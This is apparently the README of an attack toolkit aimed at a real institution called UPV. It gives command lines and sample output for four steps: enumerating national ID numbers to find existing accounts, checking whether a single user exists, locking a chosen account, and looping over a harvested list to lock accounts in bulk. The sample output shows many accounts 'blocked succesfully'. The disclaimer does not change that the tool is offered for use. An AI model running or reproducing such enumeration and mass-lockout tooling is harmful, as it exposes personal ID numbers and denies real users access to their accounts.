> Disclaimer:
>
> The author is not responsable of any damage caused by someone has used the software

# Experimental version

This version was tested in `2023 Oct 27`. If stopped working in the future, please open an issue to update the code.


## Example of use

* Recollect data
* Test user
* Block user accoun
* Block multiple users

### Recollect data

```bash
python3 .\recollect.py -m 23887868 -M 53887869
```

Output (All existing DNI in UPV inside the -m and -M range):
```txt
52xxxxxx
23xxxxxx
23xxxxxx
23xxxxxx
23xxxxxx
23xxxxxx
23xxxxxx
...

> All data is dumped into users.txt
```


### Test user

```bash
python3 ./test.py -u 23181169
```

Output (Show if user exist in UPV list):
```txt
User not found in UPV domain
========= End =========

> All data is dumped into test.txt file
```


### Block user account

```bash
python3 ./bomb.py -u 53887869
```

Output (Show the status of attack):
```txt
> For not found user
User not found in UPV domain
========= End =========

> For found user
User account blocked succesfully!
========= End =========
```


### Block multiple users

To do this action you have to define a file called `./users.txt` that store the user dni one per line.
Also this job can be done with `recollect data` section to scan all the dni

Windows:
```bat
.\loopbomb.bat
```

Linux / Unix:
```bash
./loopbomb.sh
```

Output (All the status)
```txt
User account blocked succesfully!
========= End =========
User account blocked succesfully!
========= End =========
User account blocked succesfully!
========= End =========
User account blocked succesfully!
========= End =========
User account blocked succesfully!
========= End =========
User account blocked succesfully!
========= End =========
User account blocked succesfully!
========= End =========
User account blocked succesfully!
========= End =========
```


